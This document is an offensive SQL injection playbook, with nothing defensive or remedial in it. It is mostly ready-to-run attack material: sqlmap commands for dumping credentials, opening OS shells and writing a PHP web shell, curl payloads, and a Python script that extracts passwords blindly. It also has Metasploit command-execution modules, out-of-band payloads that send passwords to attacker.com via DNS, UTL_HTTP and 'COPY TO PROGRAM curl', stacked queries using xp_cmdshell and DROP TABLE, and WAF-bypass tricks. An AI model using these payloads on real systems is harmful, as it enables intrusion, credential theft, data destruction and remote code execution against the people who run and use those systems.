# SQL Injection Playbook

## Indicators

Signs this vulnerability may be present:
- Application displays database error messages (syntax errors, driver errors)
- Input reflected in error messages with SQL keywords visible
- Numeric parameters that change query results when modified
- Search functionality with complex filtering options
- Login forms or authentication endpoints
- URLs with parameters like `id=`, `cat=`, `user=`, `order=`, `sort=`
- API endpoints accepting JSON/XML with database-like field names
- Application behaves differently with single quote (`'`) or double quote (`"`) input

## Database Fingerprinting

| Database   | Version Query              | Comment Syntax      | String Concat        | Error Pattern                |
|------------|----------------------------|---------------------|----------------------|------------------------------|
| MySQL      | `@@version`, `VERSION()`   | `-- `, `#`, `/**/`  | `CONCAT()`, `||`     | `You have an error in your SQL syntax` |
| MSSQL      | `@@VERSION`                | `--`, `/**/`        | `+`                  | `Unclosed quotation mark`    |
| PostgreSQL | `version()`                | `--`, `/**/`        | `||`                 | `unterminated quoted string` |
| Oracle     | `banner FROM v$version`    | `--`, `/**/`        | `||`                 | `ORA-00933`                  |
| SQLite     | `sqlite_version()`         | `--`, `/**/`        | `||`                 | `SQLITE_ERROR`               |

## Tools

### SQLMap

```bash
# Basic usage with URL parameter
sqlmap -u "http://target.com/page?id=1" --batch

# POST request with form data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# With cookies and headers
sqlmap -u "http://target.com/api?id=1" --cookie="session=abc123" \
       --headers="Authorization: Bearer token123" --batch

# Specify injection point with asterisk
sqlmap -u "http://target.com/page?id=1*&other=value" --batch

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p "id" --batch

# Specify DBMS to speed up testing
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

# Increase risk and level for thorough testing
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerate tables in database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C "username,password" --dump --batch

# Get database user and privileges
sqlmap -u "http://target.com/page?id=1" --current-user --is-dba --batch

# OS shell (if DB user has file privileges)
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# SQL shell for custom queries
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch

# Read file from server
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch

# Write file to server
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# Use tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch

# From Burp request file
sqlmap -r request.txt --batch

# JSON body injection
sqlmap -u "http://target.com/api" --data='{"id":1}' --batch

# Second-order injection
sqlmap -u "http://target.com/register" --data="user=test" \
       --second-url="http://target.com/profile" --batch
```

### Manual Testing

```bash
# Basic error-based test
curl "http://target.com/page?id=1'"
curl "http://target.com/page?id=1\""

# Test for numeric injection
curl "http://target.com/page?id=1+AND+1=1"
curl "http://target.com/page?id=1+AND+1=2"

# Test for string injection
curl "http://target.com/page?name=admin'+AND+'1'='1"
curl "http://target.com/page?name=admin'+AND+'1'='2"

# UNION-based column enumeration
curl "http://target.com/page?id=1+ORDER+BY+1--"
curl "http://target.com/page?id=1+ORDER+BY+5--"
curl "http://target.com/page?id=1+ORDER+BY+10--"

# UNION-based data extraction (adjust column count)
curl "http://target.com/page?id=-1+UNION+SELECT+1,2,3,4,5--"
curl "http://target.com/page?id=-1+UNION+SELECT+1,@@version,3,4,5--"

# Time-based blind injection
curl "http://target.com/page?id=1'+AND+SLEEP(5)--"
curl "http://target.com/page?id=1';WAITFOR+DELAY+'0:0:5'--"

# Boolean-based blind injection
curl "http://target.com/page?id=1'+AND+SUBSTRING(@@version,1,1)='5'--"

# Stacked queries (MSSQL, PostgreSQL)
curl "http://target.com/page?id=1';INSERT+INTO+users+VALUES('hacker','pass')--"

# POST request testing
curl -X POST "http://target.com/login" -d "username=admin'--&password=x"

# JSON body injection
curl -X POST "http://target.com/api" \
     -H "Content-Type: application/json" \
     -d '{"id":"1 OR 1=1--"}'
```

### Python Script for Blind SQLi

```python
#!/usr/bin/env python3
import requests
import string
import sys

url = "http://target.com/page"
charset = string.ascii_lowercase + string.digits + "_"
extracted = ""

# Boolean-based extraction
for position in range(1, 50):
    found = False
    for char in charset:
        payload = f"1' AND SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)='{char}'--"
        response = requests.get(url, params={"id": payload})

        if "Welcome" in response.text:  # True condition indicator
            extracted += char
            print(f"Found: {extracted}")
            found = True
            break

    if not found:
        break

print(f"Extracted: {extracted}")
```

### Metasploit Modules

```bash
# MySQL login scanner
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# MySQL enumeration
use auxiliary/admin/mysql/mysql_enum
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run

# MySQL file read
use auxiliary/admin/mysql/mysql_sql
set RHOSTS target.com
set USERNAME root
set PASSWORD password
set SQL "SELECT LOAD_FILE('/etc/passwd')"
run

# MSSQL login scanner
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target.com
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# MSSQL command execution
use auxiliary/admin/mssql/mssql_exec
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
set CMD "whoami"
run

# MSSQL SQL query
use auxiliary/admin/mssql/mssql_sql
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
set SQL "SELECT @@version"
run

# PostgreSQL login scanner
use auxiliary/scanner/postgres/postgres_login
set RHOSTS target.com
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# PostgreSQL command execution
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS target.com
set USERNAME postgres
set PASSWORD password
set LHOST attacker.com
run
```

## Techniques

### 1. Error-Based Injection

Extracts data through database error messages.

```sql
-- MySQL error-based using EXTRACTVALUE
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--

-- MySQL error-based using UPDATEXML
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- MSSQL error-based
1' AND 1=CONVERT(int,(SELECT @@version))--

-- PostgreSQL error-based
1' AND 1=CAST((SELECT version()) AS int)--

-- Oracle error-based
1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### 2. UNION-Based Injection

Combines results from injected query with original query.

```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 10--

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL,NULL--

-- Step 3: Extract data
' UNION SELECT username,password,NULL,NULL,NULL FROM users--

-- MySQL specific
' UNION SELECT 1,@@version,3,4,5--
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- MSSQL specific
' UNION SELECT 1,@@version,3,4,5--
' UNION SELECT 1,name,3,4,5 FROM sysobjects WHERE xtype='U'--

-- PostgreSQL specific
' UNION SELECT 1,version(),3,4,5--
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--

-- Oracle specific (requires FROM dual)
' UNION SELECT NULL,banner,NULL,NULL,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM all_tables--
```

### 3. Blind Boolean-Based Injection

Infers data from true/false responses.

```sql
-- Test for blind SQLi
' AND 1=1--  (should return normal response)
' AND 1=2--  (should return different/empty response)

-- Extract database version character by character
' AND SUBSTRING(@@version,1,1)='5'--
' AND SUBSTRING(@@version,1,1)='8'--

-- Extract data length
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10--

-- Binary search for efficiency
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--

-- MySQL specific
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

-- MSSQL specific
' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--
```

### 4. Blind Time-Based Injection

Infers data from response time delays.

```sql
-- MySQL time-based
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- MSSQL time-based
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL time-based
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle time-based
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### 5. Out-of-Band (OOB) Injection

Exfiltrates data through DNS or HTTP requests.

```sql
-- MySQL OOB via DNS (requires LOAD_FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share'))--
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--

-- MSSQL OOB via xp_dirtree
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @data varchar(1024);
   SET @data=(SELECT TOP 1 password FROM users);
   EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"')--

-- Oracle OOB via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--

-- Oracle OOB via UTL_INADDR (DNS)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual--

-- PostgreSQL OOB via COPY
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?data='||password--
```

### 6. Stacked Queries

Execute multiple statements (works on MSSQL, PostgreSQL, sometimes MySQL).

```sql
-- MSSQL stacked queries
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

-- PostgreSQL stacked queries
'; INSERT INTO users VALUES('hacker','password')--
'; CREATE TABLE exfil(data text); COPY exfil FROM '/etc/passwd'--
'; DROP TABLE users--

-- MySQL stacked queries (requires mysqli_multi_query)
'; INSERT INTO users VALUES('hacker','password')--
```

## Bypass Techniques

### WAF Evasion

```sql
-- Case manipulation
uNiOn SeLeCt
UNION/**/SELECT

-- Comment injection
UN/**/ION SEL/**/ECT
/*!50000UNION*/ /*!50000SELECT*/

-- URL encoding
%55%4e%49%4f%4e %53%45%4c%45%43%54
%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT

-- Double URL encoding
%252f%252a%252a%252fUNION

-- Whitespace alternatives
UNION[0x09]SELECT
UNION[0x0a]SELECT
UNION[0x0d]SELECT
UNION%09SELECT
UNION%0aSELECT

-- Null bytes
%00UNION SELECT
UNION%00SELECT

-- HPP (HTTP Parameter Pollution)
id=1&id=UNION&id=SELECT
```

### Filter Bypass - No Quotes

```sql
-- Using hex encoding
SELECT * FROM users WHERE username=0x61646d696e

-- Using CHAR() function
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)

-- MySQL specific
SELECT * FROM users WHERE username=unhex('61646d696e')
```

### Filter Bypass - No Spaces

```sql
-- Using comments
SELECT/**/password/**/FROM/**/users

-- Using parentheses
SELECT(password)FROM(users)

-- Using tabs and newlines
SELECT%09password%09FROM%09users
SELECT%0apassword%0aFROM%0ausers

-- Using plus signs (MSSQL)
SELECT+password+FROM+users
```

### Filter Bypass - Blocked Keywords

```sql
-- Double keywords
SELSELECTECT (when SELECT is removed, becomes SELECT)

-- Alternate functions
MID() instead of SUBSTRING()
SUBSTR() instead of SUBSTRING()

-- Alternate comparisons
LIKE instead of =
BETWEEN 97 AND 97 instead of =97

-- Avoid OR/AND
|| instead of OR (MySQL)
&& instead of AND (MySQL)

-- Avoid = sign
LIKE for string comparison
<> or != negation with NOT
BETWEEN for ranges
```

### Filter Bypass - Second Order SQLi

```sql
-- Register with malicious username
admin'--

-- When username is used in another query unsanitized
SELECT * FROM logs WHERE user='admin'--'
```

## Success Indicators

- Database error messages containing SQL syntax or schema information
- Different response content for true vs false conditions
- Measurable time delay in responses (5+ seconds for time-based)
- Successful data extraction (usernames, passwords, table names)
- Ability to enumerate database structure (tables, columns)
- DNS/HTTP callbacks received at attacker server (OOB)
- Successful login bypass with `' OR 1=1--`
- File read/write operations successful
- Command execution achieved via database features
- Data modification confirmed (INSERT/UPDATE/DELETE)
